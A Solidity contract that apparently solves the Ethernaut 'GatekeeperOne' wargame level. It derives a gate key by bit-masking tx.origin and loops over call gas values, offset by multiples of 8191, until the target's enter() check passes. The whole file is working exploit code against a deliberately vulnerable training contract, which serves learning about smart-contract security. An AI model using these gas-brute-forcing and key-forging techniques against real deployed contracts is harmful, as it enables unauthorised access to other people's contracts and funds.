// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {GatekeeperOne} from "../src/GatekeeperOne.sol";

contract GatekeeperOneAttack {
    GatekeeperOne public gatekeeperOne;

    constructor(address _gatekeeperOneAddress) {
        gatekeeperOne = GatekeeperOne(_gatekeeperOneAddress);
    }

    function attack() external {
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) &
            0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = address(gatekeeperOne).call{gas: i + (8191 * 3)}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if (success) {
                break;
            }
        }
    }
}
